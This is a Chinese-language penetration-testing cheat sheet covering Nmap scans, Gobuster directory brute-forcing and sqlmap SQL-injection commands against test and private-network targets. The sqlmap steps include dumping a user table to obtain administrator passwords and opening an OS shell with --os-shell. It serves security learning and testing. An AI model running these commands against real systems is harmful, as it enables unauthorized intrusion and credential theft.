-Nmap：主机存活、端口扫描、服务版本、漏洞脚本探测。

基础端口 + 版本扫描：

nmap -sV -sC test.com -oN web_scan.txt：
- sV：探测服务版本（apache/nginx 版本）。
- sC：默认脚本，获取 http 标题、头信息。
- oN 输出报告。

只看 80、443 web 端口：
nmap -p 80,443 test.com。

基础存活扫描：

nmap -sn 192.168.1.0/24：
-sn：不做端口扫描，仅探测哪些机器在线，定位目标 IP。

全端口 + 版本扫描（重点）：

nmap -p- -sV -sC 192.168.1.100 -oN nmap_result.txt：

参数说明：
- p：扫描全部 65535 端口。
- sV：探测端口运行的服务版本（Apache/nginx、php 版本）。
- sC：调用 nmap 默认脚本库，扫 web、ssh 等常见漏洞。
- oN：输出文本报告。

漏洞脚本扫描（可选）：

nmap --script vuln 192.168.1.100。

-Gobuster：目录爆破。

http 模式爆破目录：
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -o gobuster.txt。

参数说明：
- dir：目录爆破模式。
- u：目标 URL。
- w：字典，kali 自带 common.txt。
- x php,txt,html,bak：扫描带这些后缀的文件，找`.php`动态页面（大概率存在 SQL 注入）、备份`.bak`。
- o：输出结果。


-Sqlmap SQL：注入检测与利用。

GET 参数注入（最常见，news.php?id=1）：
sqlmap -u "http://192.168.1.100/news.php?id=1"。
输出 Parameter: id (GET) is vulnerable→ 确认 id 参数存在 SQL 注入漏洞。

获取数据库名：
sqlmap -u "http://192.168.1.100/news.php?id=1" --dbs：
--dbs：列出所有数据库，返回例如 `information_schema`、`news_db`。

指定库，获取表名：
sqlmap -u "http://192.168.1.100/news.php?id=1" -D news_db --tables：
- D 指定数据库名。
- tables获取所有表，得到 `user`、`article`。

获取表字段：
sqlmap -u "http://192.168.1.100/news.php?id=1" -D news_db -T user --columns：
- -T 指定表名。
- columns 获取列：`id,username,password`。

脱库，导出账号密码：
sqlmap -u "http://192.168.1.100/news.php?id=1" -D news_db -T user --dump：
--dump：导出表全部数据，拿到管理员账号密码。

POST 表单注入（登录框）：
抓包拿到 POST 请求数据：`username=test&password=123`。
sqlmap -u "http://192.168.1.100/admin.php" --data "username=test&password=123"
-data 指定 post 提交参数。

高级：获取 shell（条件允许才可以）：
sqlmap -u "http://192.168.1.100/news.php?id=1" --os-shell。
